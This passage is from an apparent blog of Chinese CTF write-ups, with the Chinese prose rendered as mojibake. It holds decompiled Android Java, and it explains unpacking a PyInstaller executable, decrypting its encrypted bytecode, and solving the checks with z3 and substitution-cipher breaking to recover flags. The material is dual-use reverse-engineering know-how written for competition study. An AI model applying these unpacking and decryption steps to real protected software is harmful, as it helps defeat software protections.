v9 = v15.indexOf(v0[v6]); if(v9 == -1) { v0 = ((byte[])v7); } else { v4.append(Integer.toBinaryString((v9 &amp; 0x3F) + v2).substring(1)); ++v6; continue; } } else { break; } goto label_56; } int v0_1; for(v0_1 = 0; v0_1 &lt; (40 - v4.length() % 40) % 40; ++v0_1) { v4.append('0'); } String v0_2 = v4.toString(); for(v2 = 0; v2 &lt; v0_2.length(); v2 = v4_1) { v4_1 = v2 + 8; v3.write(((byte)(Integer.parseInt(v0_2.substring(v2, v4_1), 2) &amp; 0xFF))); } v0 = v3.toByteArray(); label_56: if(v0 == null) { goto label_157; } BigDecimal v2_1 = new BigDecimal(\"1\"); BigDecimal v3_1 = new BigDecimal(\"0\"); BigDecimal v4_2 = new BigDecimal(\"6\"); MathContext v5_1 = new MathContext(360, RoundingMode.HALF_UP); MathContext v6_1 = new MathContext(720, RoundingMode.HALF_UP); v9 = 0; while(true) { v2_1 = class_a.func(new BigDecimal(\"2\").subtract(class_a.func(new BigDecimal(4).subtract(v2_1.multiply(v2_1, v6_1), v6_1), v6_1)), v6_1); v4_2 = new BigDecimal(\"2\").multiply(v4_2, v5_1); v10 = new BigDecimal(\"0.5\").multiply(v2_1.multiply(v4_2, v5_1), v5_1); v11 = \"StudyDesk:\"; if(v10.compareTo(v3_1) == 0) { break; } ++v9; if(v9 % 30 == 0) { StringBuilder v3_2 = a.e(\"running: \"); v3_2.append(v9 / 6); v3_2.append(\"%\"); Log.i(v11, v3_2.toString()); } v3_1 = v10; } Log.i(v11, \"running: 100%\"); String v2_2 = v10.toString().replace(\".\", \"\"); int v3_3 = 0; while(true) { if(v3_3 &lt; v2_2.length()) { v4_1 = v3_3 + 2; if((((byte)(Integer.parseInt(v2_2.substring(v3_3, v4_1), 10) &amp; 0xFF))) != v0[v3_3 / 2]) { v0_1 = 0; } else { v3_3 = v4_1; continue; } } else { break; } goto label_120; } v0_1 = 1; label_120: if(v0_1 == 0) { goto label_157; } Toast.makeText(this.b, \"Congs, good student!\", 0).show(); this.b.q.setText(String.format(\"flag{%s}\", v15)); this.b.p.setText(\"Congs!\"); this.b.p.setClickable(false); this.b.o.setKeyListener(v7); return; } label_157: Toast.makeText(this.b, \"Nonono, study harder please\", 0).show(); } } public class class_a { public static byte[] arr; public static { class_a.arr = new byte[]{0x73, 0x6F, 43, 0x72, 0x74, 45, 0x30, 36, 84, 98, 89, 36, 38, 66, 38, 43, 84, 0x79, 50, 101, 101, 43, 100, 87, 69, 0x6F, 51, 66, 89, 49, 69, 51, 101, 51, 53, 0x74, 45, 98, 98, 0x72, 50, 36, 98, 50, 85, 85, 85, 107, 66, 36, 53, 51, 0x6F, 0x72, 89, 89, 66, 50, 33, 66, 0x5F, 66, 101, 0x79, 0x5F, 0x40, 33, 66, 50, 0x40, 85, 85, 45, 43, 36, 50, 0x74, 0x30, 85, 0x73, 0x5F, 0x40, 49, 0x72, 50, 101, 101, 51, 51, 43, 53, 51, 53, 51, 85, 50, 0x40, 0x79, 53, 36, 0x40, 69, 89, 98, 45, 0x6F, 101, 36, 97, 66, 100, 0x30, 0x73, 97, 0x30, 36, 0x6F, 101, 50, 0x5F, 49, 0x30, 0x40, 89, 0x74, 85, 0x30, 85, 0x73, 89, 43, 89, 97, 0x30, 89, 0x72, 97, 100, 38, 50, 0x74, 51, 98, 0x75, 0x5F, 50, 0x74, 0x73, 0x6F, 84, 98, 89, 69, 0x6F, 100, 0x30, 0x6F, 98, 89, 0x72, 0x40, 50, 36, 66, 89, 101, 0x72, 51, 84, 51, 50, 36, 38, 0x40, 0x30, 53, 51, 0x30, 49, 97, 0x74, 89, 101, 85, 97, 66, 84, 97, 45, 43, 100, 89, 45, 0x30, 0x73, 0x30, 0x40, 97, 100, 98, 51, 100, 0x6F, 0x73, 50, 53, 101, 66, 101, 0x6F, 0x75, 50, 45, 0x5F, 51, 82, 50, 89, 87, 101, 50, 89, 0x30, 89, 101, 43, 89, 36, 38, 61, 101, 0x40, 84, 89, 0x5F, 66, 0x74, 49, 0x40, 87, 97, 43, 0x5F, 0x73, 43, 0x30, 89, 45, 84, 89, 33, 89, 107, 53, 85, 0x30, 98, 98, 0x5F, 50, 107, 66, 101, 0x6F, 51, 97, 33, 66, 97, 0x75, 51, 0x74, 51, 97, 0x40, 89, 107, 98, 51, 69, 0x40, 73, 0x5F, 0x30, 85, 0x74, 0x30, 97}; } public static BigDecimal func(BigDecimal arg3, MathContext arg4) { BigDecimal v1; BigDecimal v0; for(v0 = arg3; true; v0 = v1) { v1 = new BigDecimal(\"0.5\").multiply(v0.add(arg3.divide(v0, arg4), arg4), arg4); if(v1.compareTo(v0) == 0) { return v1; } } return v1; } } æœ‰è°ƒè¯•ç¯å¢ƒçš„å¸ˆå‚…å¯ä»¥ç»™1EEä¸‹æ–­ç‚¹çœ‹ä¸‹v2çš„å€¼ã€‚ç„¶åå»åˆ¤æ–­ä¸‹ä¸€å¼€å§‹çš„æƒ…å†µå»é€†å‘ã€‚ æœ‰javaç¯å¢ƒçš„ä¹Ÿå¯ä»¥ç¨å¾®æ”¹æ”¹ä»£ç ç„¶åè·‘ä¸‹ç›´æ¥æ‹¿æ•°å€¼ï¼Œå¯¹æ¯”çš„æ•°æ®æ˜¯ä¸æ ¹æ®è¾“å…¥å˜åŒ–çš„,ä¾‹å¦‚è·å–v2çš„ç›´æ¥ä»£ç  import org.python.antlr.ast.Str; import java.math.BigDecimal; import java.math.MathContext; import java.math.RoundingMode; public class test { public static void main(String[] args) { BigDecimal v2_1 = new BigDecimal(\"1\"); BigDecimal v3_1 = new BigDecimal(\"0\"); BigDecimal v10; BigDecimal v4_2 = new BigDecimal(\"6\"); MathContext v5_1 = new MathContext(360, RoundingMode.HALF_UP); MathContext v6_1 = new MathContext(720, RoundingMode.HALF_UP); int v9 = 0; while (true) { v2_1 = class_a.func(new BigDecimal(\"2\").subtract(class_a.func(new BigDecimal(4).subtract(v2_1.multiply(v2_1, v6_1), v6_1), v6_1)), v6_1); v4_2 = new BigDecimal(\"2\").multiply(v4_2, v5_1); v10 = new BigDecimal(\"0.5\").multiply(v2_1.multiply(v4_2, v5_1), v5_1); if (v10.compareTo(v3_1) == 0) { break; } ++v9; v3_1 = v10; } String v2_2 = v10.toString().replace(\".\", \"\"); System.out.println(v2_2); } } ma=[0x73, 0x6F, 43, 0x72, 0x74, 45, 0x30, 36, 84, 98, 89, 36, 38, 66, 38, 43, 84, 0x79, 50, 101, 101, 43, 100, 87, 69, 0x6F, 51, 66, 89, 49, 69, 51, 101, 51, 53, 0x74, 45, 98, 98, 0x72, 50, 36, 98, 50, 85, 85, 85, 107, 66, 36, 53, 51, 0x6F, 0x72, 89, 89, 66, 50, 33, 66, 0x5F, 66, 101, 0x79, 0x5F, 0x40, 33, 66, 50, 0x40, 85, 85, 45, 43, 36, 50, 0x74, 0x30, 85, 0x73, 0x5F, 0x40, 49, 0x72, 50, 101, 101, 51, 51, 43, 53, 51, 53, 51, 85, 50, 0x40, 0x79, 53, 36, 0x40, 69, 89, 98, 45, 0x6F, 101, 36, 97, 66, 100, 0x30, 0x73, 97, 0x30, 36, 0x6F, 101, 50, 0x5F, 49, 0x30, 0x40, 89, 0x74, 85, 0x30, 85, 0x73, 89, 43, 89, 97, 0x30, 89, 0x72, 97, 100, 38, 50, 0x74, 51, 98, 0x75, 0x5F, 50, 0x74, 0x73, 0x6F, 84, 98, 89, 69, 0x6F, 100, 0x30, 0x6F, 98, 89, 0x72, 0x40, 50, 36, 66, 89, 101, 0x72, 51, 84, 51, 50, 36, 38, 0x40, 0x30, 53, 51, 0x30, 49, 97, 0x74, 89, 101, 85, 97, 66, 84, 97, 45, 43, 100, 89, 45, 0x30, 0x73, 0x30, 0x40, 97, 100, 98, 51, 100, 0x6F, 0x73, 50, 53, 101, 66, 101, 0x6F, 0x75, 50, 45, 0x5F, 51, 82, 50, 89, 87, 101, 50, 89, 0x30, 89, 101, 43, 89, 36, 38, 61, 101, 0x40, 84, 89, 0x5F, 66, 0x74, 49, 0x40, 87, 97, 43, 0x5F, 0x73, 43, 0x30, 89, 45, 84, 89, 33, 89, 107, 53, 85, 0x30, 98, 98, 0x5F, 50, 107, 66, 101, 0x6F, 51, 97, 33, 66, 97, 0x75, 51, 0x74, 51, 97, 0x40, 89, 107, 98, 51, 69, 0x40, 73, 0x5F, 0x30, 85, 0x74, 0x30, 97] a='314159265358979323846264338327950288419716939937510582097494459230781640628620899862803482534211706798214808651328230664709384460955058223172535940812848111745028410270193852110555964462294895493038196442881097566593344612847564823378678316527120190914564856692346034861045432664821339360726024914127372458700660631558817488152092096282925409171536436789259036' b=[] for i in range(0,len(a),2): b.append(int(a[i:i+2])) c='' for i in b: c+=bin(i)[2:].rjust(8,'0') d=[] for i in range(0,len(c),5): d.append(int('1'+c[i:i+5],2)-0x20) print(len(d)) print(len(c)) print(len(ma)) flag=[] for i in range(32): flag.append(0xff) for i in range(len(ma)): flag[d[i]]=ma[i] print(flag) flag1='' for i in flag: flag1+=chr(i) print(\"flag{\"+flag1+\"}\")","path":"2021/10/26/CTF_2021qiangwangnitai/"},{"title":"CTF | 2021 ç½‘ä¿¡æŸé¹­æ¯ WriteUp","text":"å‰è¨€ 2021å¹´â€œç½‘ä¿¡æŸé¹­æ¯â€å¤§å­¦ç”Ÿç½‘ç»œç©ºé—´å®‰å…¨ç²¾è‹±èµ› æ¯”èµ›æ—¶é—´ï¼š2021å¹´10æœˆ24æ—¥ 9:00 - 17:00 é‡è¦ï¼2021å¹´â€œç½‘ä¿¡æŸé¹­æ¯â€å¤§å­¦ç”Ÿç½‘ç»œç©ºé—´å®‰å…¨ç²¾è‹±èµ›å»¶æœŸé€šçŸ¥ è¿™ä¸ªæ¯”èµ›æ€ä¹ˆè¯´å¥½å‘¢ï¼ŒæŒ‰å¾€å¹´æ¥è¯´ï¼Œåªæœ‰ä¸€åœºæ¯”èµ›ï¼Œæ²¡æœ‰çº¿ä¸Šé¢„é€‰èµ›ï¼Œç›´æ¥çº¿ä¸‹æ¯”ä¸€åœºé‚£ç§ï¼Œçœ‹èµ·æ¥ä¹Ÿæ¯”è¾ƒæ°´å§ã€‚ï¼ˆå½“ç„¶å»å¹´å› ä¸ºç–«æƒ…çº¿ä¸Šäº† åŸè®¡åˆ’æ˜¯äº2021å¹´9æœˆ13æ—¥åœ¨å¦é—¨ä¸¾åŠï¼Œç»“æœç»å¤§èµ›ç»„å§”ä¼šå†³å®šï¼Œå»¶æœŸè‡³10æœˆä¸­æ—¬æ¯”èµ›ï¼ŒæŠ¥åæˆªæ­¢æ—¶é—´å»¶é•¿è‡³9æœˆ26æ—¥ï¼Œæ¯”èµ›ä¹Ÿå˜æˆçº¿ä¸Šçš„äº†ã€‚ äºæ˜¯é‚£æ—¶å€™å­¦å¼Ÿå­¦å¦¹ä»¬éƒ½æŠ¥å¥½åäº†ï¼Œåæ¥ä¸€çœ‹æ—¶é—´åˆå»¶é•¿äº†ï¼Œå’±å°±æ‹‰ä¸Šä¿©ä½›ç³»é˜Ÿå‹ç»„äº†ä¸ªé˜Ÿï¼Œæ¥æ°´ä¸€æ°´å¥½äº†ã€‚ ç»“æœæ¯”èµ›å‰ä¸¤ä¸‰å¤©é˜Ÿå‹æ”¶åˆ°çŸ­ä¿¡é€šçŸ¥åŠ wxï¼Œè¯´äº†éƒ¨åˆ†æ¯”èµ›ä¿¡æ¯ï¼Œæ‰çŸ¥é“æ˜¯è¿™å‘¨æ—¥æ¯”èµ›ï¼Œç¦»å¤§è°±äº†â€¦â€¦ åæ­£å¤§å®¶éƒ½å¾ˆä½›ç³»ï¼Œè€Œä¸”è¿™å‘¨æœ«æ¯”èµ›å¤ªå¤šäº†ï¼Œå¯¼è‡´æœ€ååªæœ‰å–µå–µè‡ªå·±åšäº†å‡ é¢˜å‡ºæ¥ï¼Œå”‰ï¼Œå–µå–µèœèœï¼Œå–µå‘œå‘œï¼ˆ ç­¾åˆ°é¢˜æµè§ˆå™¨è®¿é—®ä¼š 30x è·³è½¬ï¼Œäºæ˜¯ç›´æ¥ curl MiscMisc1 å…ˆæ‹¿ Photoshop ä¿®å¤ä¸€æ³¢ï¼Œå¯ä»¥ç”¨é‚£ä¸ª å†…å®¹è¯†åˆ«å¡«å……ï¼Œé«˜åº¦å†ç¨å¾®å¤åˆ¶ç²˜è´´åŠ å¤§ä¸€ç‚¹æ–¹ä¾¿æ‰«ç ã€‚ æ‰«ç å¾—åˆ°å‹ç¼©åŒ…å¯†ç  8521457896541 èœœé›ªå†°åŸï¼Ÿï¼ æ–‡ä»¶æ‰“å¼€å‘ç°é•¿åº¦è´¼å¤§ï¼Œå¾ˆæ˜æ˜¾æœ‰é›¶å®½éšå†™ï¼Œæ‹¿åˆ° vim ä¸‹çœ‹ä¸€çœ‹ã€‚ æ‹¿ python set ç»Ÿè®¡ä¸€ä¸‹ï¼Œå‘ç°åŒ…å«äº† {'\\u200b', '\\u200c', '\\u200d', '\\u202a', '\\u202c', '\\u202d', 'åŒ…', 'å‹', 'åœ¨', 'å¯†', 'å°±', 'ç ', 'ç¼©', 'è¿™', 'é‡Œ', '\\ufeff'} ç„¶åå» é›¶å®½éšå†™ è§£å¯†ï¼Œå¾—åˆ°ä¸€ä¸ª mp3 æˆ–è€… è¿™ä¸ª ä¹Ÿè¡Œï¼Œå‘ç°è¿˜æ›´æ–°äº†ä¸ª UIï¼ˆ æ’­æ”¾å‘ç°æ˜¯ DTMFï¼Œå†…å®¹æ˜¯ 399#9311233212 è§£å‹ flag.7z æ‹¿åˆ° flag flag{ISEC-45rd4r8f4rq6h5y8u2v1x4f5y9i5afde} Reversebaby_pythoné¦–å…ˆç¡®è®¤è¿™ä¸ª exe æ˜¯ç”¨ pyinstaller æ‰“åŒ…çš„ï¼Œç‰ˆæœ¬æ˜¯ python 3.7 å‚è€ƒ [CISCN2021]ååŒ—åŒº_ctf_re_imnotavirus ç”¨ pyinstxtractor æŠŠ exe é€†å‘å› pyc PyInstaller Extractor is a Python script to extract the contents of a PyInstaller generated Windows executable file. The contents of the pyz file (usually pyc files) present inside the executable are also extracted. The header of the pyc files are automatically fixed so that a Python bytecode decompiler will recognize it. The script can run on both Python 2.x and 3.x. Pyinstaller versions 2.0, 2.1, 3.0, 3.1, 3.2, 3.3, 3.4, 3.5, 3.6, 4.0, 4.1, 4.2, 4.3, 4.4, 4.5, 4.5.1 are tested &amp; supported. Probably will work with other versions too. python pyinstxtractor.py baby.exe ç„¶è€Œé€šè¿‡æç¤ºä¿¡æ¯å¯ä»¥å‘ç°è¿™äº› pyc éƒ½åŠ å¯†äº†ã€‚ ç„¶åè¿›å…¥ baby.exe_extracted æ–‡ä»¶å¤¹ï¼Œåç¼–è¯‘ pyimod02_archive.pyc uncompyle6 pyimod02_archive.pyc &gt; pyimod02_archive.py åŒç†ï¼Œåç¼–è¯‘ baby.pyc å¾—åˆ°ä¸»å‡½æ•°é€»è¾‘ï¼Œè°ƒç”¨äº† baby_python.baby_coreã€‚ åœ¨è¿™ä¸ª pyimod02_archive.py åŸºç¡€ä¸Šè§£å¯†æ ¸å¿ƒçš„æ•°æ®æ ¡éªŒéƒ¨åˆ†ä»£ç ï¼Œä¹Ÿå°±æ˜¯ PYZ-00.pyz_extracted\\baby_python\\baby_core.pyc.encrypted è¿™ä¸ªæ–‡ä»¶ã€‚ åœ¨ pyimod02_archive.py æ–‡ä»¶æœ€åé¢å†™å…¥ inf = open(r'PYZ-00.pyz_extracted\\baby_python\\baby_core.pyc.encrypted', 'rb') c = Cipher() buf = c.decrypt(inf.read()) buf = zlib.decompress(buf) # æŸ¥çœ‹è¿™ä¸ªä»£ç æ–‡ä»¶èƒ½å‘ç°å¯†æ–‡æ˜¯ç”¨zlibå‹ç¼©è¿‡çš„æ‰€ä»¥éœ€è¦è§£å‹ç¼© out = open(r'PYZ-00.pyz_extracted\\baby_python\\baby_core.pyc', 'wb') out.write(buf) print('written down %d bytes' % len(buf)) inf.close() out.close() ç„¶åè¿è¡Œï¼Œå¾—åˆ°è§£å¯†åçš„ pycã€‚ å‚è€ƒ struct.pyc å¤´éƒ¨16bytesï¼Œç»™è¿™ä¸ª baby_core.pyc è¡¥ä¸Š magic number ç­‰ä¿¡æ¯ã€‚ ç„¶ååç¼–è¯‘è¿™ä¸ª pycï¼Œå¾—åˆ° py æºä»£ç ã€‚ uncompyle6 baby_core.pyc &gt; baby_core.py # uncompyle6 version 3.7.4 # Python bytecode 3.7 (3394) # Decompiled from: Python 3.7.3 (default, Mar 27 2019, 17:13:21) [MSC v.1915 64 bit (AMD64)] # Embedded file name: baby_python\\baby_core.py # Compiled at: 1995-09-28 00:18:56 # Size of source mod 2**32: 272 bytes import hashlib def md5(s: bytes) -&gt; str: m = hashlib.md5() m.update(s) return m.hexdigest().lower() def main(): secret = input('secret: ') if len(secret) != 48: return else: return secret.isnumeric() or None values = [] for i in range(0, 48, 3): values.append(int(secret[i:i + 3])) co = [[158, 195, 205, 229, 213, 238, 211, 198, 190, 226, 135, 119, 145, 205, 113, 122], [ 234, 256, 185, 253, 244, 134, 102, 117, 190, 106, 131, 205, 198, 234, 162, 218], [ 164, 164, 209, 200, 168, 226, 189, 151, 253, 241, 232, 151, 193, 119, 226, 193], [ 213, 117, 151, 103, 249, 148, 103, 213, 218, 222, 104, 228, 100, 206, 218, 177], [ 217, 202, 126, 214, 195, 125, 144, 105, 152, 118, 167, 137, 171, 173, 206, 240], [ 160, 134, 131, 135, 186, 213, 146, 129, 125, 139, 174, 205, 177, 240, 194, 181], [ 183, 213, 127, 136, 136, 209, 199, 191, 150, 218, 160, 111, 191, 226, 154, 191], [ 247, 188, 210, 219, 179, 204, 155, 220, 215, 127, 225, 214, 195, 162, 214, 239], [ 108, 112, 104, 133, 178, 138, 110, 176, 232, 124, 193, 239, 131, 138, 161, 218], [ 140, 213, 142, 181, 179, 173, 203, 208, 184, 129, 129, 119, 122, 152, 186, 124], [ 105, 205, 124, 142, 175, 184, 234, 119, 195, 218, 141, 122, 202, 202, 190, 178], [ 183, 178, 256, 124, 241, 132, 163, 209, 204, 104, 175, 211, 196, 136, 158, 210], [ 224, 144, 189, 106, 177, 251, 206, 163, 167, 144, 208, 254, 117, 253, 100, 106], [ 251, 251, 136, 170, 145, 177, 175, 124, 193, 188, 193, 198, 208, 171, 151, 230], [ 143, 200, 143, 150, 243, 148, 136, 213, 161, 224, 170, 208, 185, 117, 189, 242], [ 234, 188, 226, 194, 248, 168, 250, 244, 166, 106, 113, 218, 209, 220, 158, 228]] r = [ 472214, 480121, 506256, 449505, 433390, 435414, 453899, 536361, 423332, 427624, 440268, 488759, 469049, 484574, 480266, 522818] for i in range(16): v = 0 for j in range(16): v += co[i][j] * values[j] if v != r[i]: return print('flag{ISEC-%s}' % md5(secret.encode())) # okay decompiling baby_core.pyc å¯ä»¥çœ‹å‡ºï¼Œè¾“å…¥çš„æ•°å­—ä¸º48ä½ï¼Œä¸‰ä½ä¸‰ä½å°†è½¬æˆ values æ•°ç»„ï¼Œåšäº†ä¸ªçŸ©é˜µæ±‚è§£ï¼Œåˆ¤æ–­ç»“æœæ˜¯å¦ä¸ r ç›¸ç¬¦ã€‚ é‚£å…¶å®å°±æ˜¯è¦æ±‚è¿™ä¸ªçŸ©é˜µçš„ç³»æ•° values äº†ï¼Œæœ€åæ‹¿ z3 solver ä¸€æŠŠæ¢­ å°±å®Œäº‹äº†~ from z3 import * import hashlib def md5(s: bytes) -&gt; str: m = hashlib.md5() m.update(s) return m.hexdigest().lower() co = [[158, 195, 205, 229, 213, 238, 211, 198, 190, 226, 135, 119, 145, 205, 113, 122], [ 234, 256, 185, 253, 244, 134, 102, 117, 190, 106, 131, 205, 198, 234, 162, 218], [ 164, 164, 209, 200, 168, 226, 189, 151, 253, 241, 232, 151, 193, 119, 226, 193], [ 213, 117, 151, 103, 249, 148, 103, 213, 218, 222, 104, 228, 100, 206, 218, 177], [ 217, 202, 126, 214, 195, 125, 144, 105, 152, 118, 167, 137, 171, 173, 206, 240], [ 160, 134, 131, 135, 186, 213, 146, 129, 125, 139, 174, 205, 177, 240, 194, 181], [ 183, 213, 127, 136, 136, 209, 199, 191, 150, 218, 160, 111, 191, 226, 154, 191], [ 247, 188, 210, 219, 179, 204, 155, 220, 215, 127, 225, 214, 195, 162, 214, 239], [ 108, 112, 104, 133, 178, 138, 110, 176, 232, 124, 193, 239, 131, 138, 161, 218], [ 140, 213, 142, 181, 179, 173, 203, 208, 184, 129, 129, 119, 122, 152, 186, 124], [ 105, 205, 124, 142, 175, 184, 234, 119, 195, 218, 141, 122, 202, 202, 190, 178], [ 183, 178, 256, 124, 241, 132, 163, 209, 204, 104, 175, 211, 196, 136, 158, 210], [ 224, 144, 189, 106, 177, 251, 206, 163, 167, 144, 208, 254, 117, 253, 100, 106], [ 251, 251, 136, 170, 145, 177, 175, 124, 193, 188, 193, 198, 208, 171, 151, 230], [ 143, 200, 143, 150, 243, 148, 136, 213, 161, 224, 170, 208, 185, 117, 189, 242], [ 234, 188, 226, 194, 248, 168, 250, 244, 166, 106, 113, 218, 209, 220, 158, 228]] r = [ 472214, 480121, 506256, 449505, 433390, 435414, 453899, 536361, 423332, 427624, 440268, 488759, 469049, 484574, 480266, 522818] s = Solver() values = [Int('v%d' % i) for i in range(16)] for i in range(16): v = 0 for j in range(16): v += co[i][j] * values[j] s.add(v == r[i]) for j in range(16): s.add(values[j] &gt; 0) s.check() answer = s.model() print(answer) # [v13 = 103, v9 = 109, v12 = 152, v14 = 124, v10 = 244, v2 = 188, v0 = 113, v3 = 123, v15 = 165, v6 = 154, v7 = 241, v4 = 164, v8 = 163, v11 = 215, v1 = 201, v5 = 176] result = \"\".join([str(answer[each]) for each in values]) print(result) # 113201188123164176154241163109244215152103124165 len(result) # 48 print('flag{ISEC-%s}' % md5(result.encode())) # flag{ISEC-ca32ab6174689b5e366241ad58108c68} Extensive Reading: åç¼–è¯‘Pythonæ‰“åŒ…çš„å¯æ‰§è¡Œç¨‹åº è¿™ä¸ªç”¨çš„ archive_viewer.py pythoné€†å‘å®æˆ˜ï¼šåç¼–è¯‘pyinstalleræ‰“åŒ…ç”Ÿæˆçš„exe pythonç¨‹åºçš„æ‰“åŒ…/ç ´è§£/åŠ å¯† ä¸‹é¢æ˜¯ Z3 ç›¸å…³ï¼Œå–µå–µä¹‹å‰å†™çš„ Z3 Introduction 2021 TCTF/0CTF Quals zer0lfsr- ä¸€é¢˜ CryptoCrypto2åˆæ˜¯ä¸€å †ç¼–ç å¥—å¨ƒâ€¦â€¦ å¼€å±€æ˜¯ åå…­è¿›åˆ¶ç¼–ç  486d65656d727720516372697a716e7a72707a687271207262205a6278656d7163206e767a612072626b206e65727468706d7863615b32362c34352c31362c35362c31375d2c20686d6b7a657420707a7872706b7a6b2072712061637a2078707a72617a71612068706d617a70206d622061637a205a6278656d716320657262787372787a2072626b2061637a20687670656b2771206e707a2d7a776d627a6261206b70727772616d71612e437a206d71207675617a62206a7265657a6b205a62786572626b2771206272616d76627265206e767a612072626b2061637a20224472706b2076752052677662225b382c32302c33382c31322c37322c34322c332c365d2e436d7120717370676d676d62782068767069712c206d626a65736b6d6278207176777a206a7665657264767072616d7662712c206a7662716d7161207675207264767361203338206e657274712c717662627a61712c206168762065766278206272707072616d677a206e767a77712c2072626b20717a677a707265207661637a70206e767a77712e20436d71206e65727471206372677a20647a7a622061707262716572617a6b206d626176207a677a70742077726c767020656d676d627820657262787372787a2072626b2072707a206e7a70757670777a6b207776707a207675617a62206163726220616376717a20767520726274207661637a70206e65727468706d7863615b31302c36322c31322c35392c332c33382c35312c34352c342c31342c34312c31335d2e0a516372697a716e7a72707a2068727120647670622072626b2070726d717a6b206d622051617072617576706b2d736e76622d526776622e2041637a20697a74206d712076622061636d7120716172787a2e2052612061637a2072787a2076752031382c20637a20777270706d7a6b205262627a2043726163726872742c20686d6163206863767720637a2063726b206163707a7a206a636d656b707a623a20517371726262722c2072626b2061686d627120437277627a612072626b204c736b6d61632e20447a61687a7a6220313538352072626b20313539322c20637a20647a78726220722071736a6a7a7171757365206a72707a7a705b34312c34332c32322c35342c31322c34322c33332c35312c385d206d62204576626b766220727120726220726a6176702c2068706d617a702c2072626b206e727061207668627a702076752072206e6572746d6278206a76776e726274206a7265657a6b2061637a204576706b204a637277647a7065726d62277120577a622c206572617a702069627668622072712061637a20496d6278277120577a622e2041637a20756572782074767320627a7a6b206d7120637a707a3a615474486c545369587a4961677a7351596970684d446467635566616d765a554a444c634d7441427672553d3d2e20437a20726e6e7a727071206176206372677a20707a616d707a6b2061762051617072617576706b2072707673626b20313631332c2068637a707a20637a206b6d7a6b206163707a7a20747a727071206572617a702e20557a6820707a6a76706b7120767520516372697a716e7a72707a2771206e706d6772617a20656d757a20717370676d677a2c2072626b2061637a707a2063727120647a7a62206a7662716d6b7a707264657a20716e7a6a736572616d76622072647673612071736a6320777261617a707120727120636d71206e6374716d6a726520726e6e7a727072626a7a2c20717a667372656d61742c20707a656d786d76737120647a656d7a75712c2072626b2068637a61637a702061637a20687670697120726161706d6473617a6b20617620636d7720687a707a2068706d61617a62206474207661637a70715b31362c34332c33312c332c35342c31322c33332c31352c35395d2e è½¬ ASCII Hmeemrw Qcrizqnzrpzhrq rb Zbxemqc nvza rbk nerthpmxca[26,45,16,56,17], hmkzet pzxrpkzk rq acz xpzrazqa hpmazp mb acz Zbxemqc erbxsrxz rbk acz hvpek'q npz-zwmbzba kprwramqa.Cz mq vuazb jreezk Zbxerbk'q bramvbre nvza rbk acz \"Drpk vu Rgvb\"[8,20,38,12,72,42,3,6].Cmq qspgmgmbx hvpiq, mbjeskmbx qvwz jveerdvpramvbq, jvbqmqa vu rdvsa 38 nertq,qvbbzaq, ahv evbx brppramgz nvzwq, rbk qzgzpre vaczp nvzwq. Cmq nertq crgz dzzb aprbqerazk mbav zgzpt wrlvp emgmbx erbxsrxz rbk rpz nzpuvpwzk wvpz vuazb acrb acvqz vu rbt vaczp nerthpmxca[10,62,12,59,3,38,51,45,4,14,41,13]. Qcrizqnzrpz hrq dvpb rbk prmqzk mb Qaprauvpk-snvb-Rgvb. Acz izt mq vb acmq qarxz. Ra acz rxz vu 18, cz wrppmzk Rbbz Cracrhrt, hmac hcvw cz crk acpzz jcmekpzb: Qsqrbbr, rbk ahmbq Crwbza rbk Lskmac. Dzahzzb 1585 rbk 1592, cz dzxrb r qsjjzqquse jrpzzp[41,43,22,54,12,42,33,51,8] mb Evbkvb rq rb rjavp, hpmazp, rbk nrpa vhbzp vu r nertmbx jvwnrbt jreezk acz Evpk Jcrwdzpermb'q Wzb, erazp ibvhb rq acz Imbx'q Wzb. Acz uerx tvs bzzk mq czpz:aTtHlTSiXzIagzsQYiphMDdgcUfamvZUJDLcMtABvrU==. Cz rnnzrpq av crgz pzampzk av Qaprauvpk rpvsbk 1613, hczpz cz kmzk acpzz tzrpq erazp. Uzh pzjvpkq vu Qcrizqnzrpz'q npmgraz emuz qspgmgz, rbk aczpz crq dzzb jvbqmkzprdez qnzjseramvb rdvsa qsjc wraazpq rq cmq nctqmjre rnnzrprbjz, qzfsremat, pzemxmvsq dzemzuq, rbk hczaczp acz hvpiq raapmdsazk av cmw hzpz hpmaazb dt vaczpq[16,43,31,3,54,12,33,15,59]. ç„¶åæ‹¿åˆ° quipquip ä¸€æŠŠæ¢­ å¾—åˆ°è¿™ä¸ªï¼Œå‘ç°å…¶å®å°±æ˜¯ ç»´åŸºç™¾ç§‘é‚£ä¸ªæ”¹çš„ã€‚ William Shakespearewas an English poet and playwright[26,45,16,56,17], widely regarded as the greatest writer in the English language and the world's pre-eminent dramatist.He is often called England's national poet and the \"Bard of Avon\"[8,20,38,12,72,42,3,6].His surviving works, including some collaborations, consist of about 38 plays,sonnets, two long narrative poems, and several other poems. His plays have been translated into every major living language and are performed more often than those of any other playwright[10,62,12,59,3,38,51,45,4,14,41,13]. Shakespeare was born and raised in Stratford-upon-Avon. The key is on this stage. At the age of 18, he married Anne Hathaway, with whom he had three children: Susanna, and twins Hamnet and Judith. Between 1585 and 1592, he began a successful career[41,43,22,54,12,42,33,51,8] in London as an actor, writer, and part owner of a playing company called the Lord Chamberlain's Men, later known as the King's Men. The flag you need is here:tYyWjYUkGeKtveuSZkrwIBbvhFxtioEFCBJhIyTNoaF==. He appears to have retired to Stratford around 1613, where he died three years later. Few records of Shakespeare's private life survive, and there has been considerable speculation about such matters as his physical appearance, sexuality, religious beliefs, and whether the works attributed to him were written by others[16,43,31,3,54,12,33,15,59]. è¿™ä¸²è¯´çš„ flag å¥½åƒ base64 å•Šï¼Œç„¶è€Œå‘ç°åç§»éƒ½ä¸å¯¹ã€‚ åˆå‘ç°å»æ‰ == ä¹‹åé•¿åº¦ä¸º 43ï¼Œè€Œè¿™äº›æ•°ç»„åˆèµ·æ¥çš„å…ƒç´ ä¸ªæ•°ä¹Ÿæ˜¯ 43ï¼Œå¯»æ€ç€å­˜åœ¨æŸç§æ˜ å°„ã€‚ä½†æ˜¯ä¸€æƒ³æœ€å¤§å€¼ 72ï¼Œä¸å¯èƒ½æ˜¯æ”¹ base64 è¡¨äº†ã€‚ æ‘¸ä¸ç€å¤´è„‘.jpg åæ¥é˜Ÿå‹æƒ³äº†ä¸ªåŠå¤©ä¹Ÿæ²¡æƒ³å‡ºæ¥ï¼Œæ‘¸äº†ã€‚ èµ›åæ‰çŸ¥é“ï¼Œæ˜¯ é€ä½å¼‚æˆ– å•Šï¼Œè‰äº†å•Šå•Šå•Šå•Šå•Šå•Šï¼å–µå‘œå‘œã€‚ Exp: s = \"tYyWjYUkGeKtveuSZkrwIBbvhFxtioEFCBJhIyTNoaF\" l = 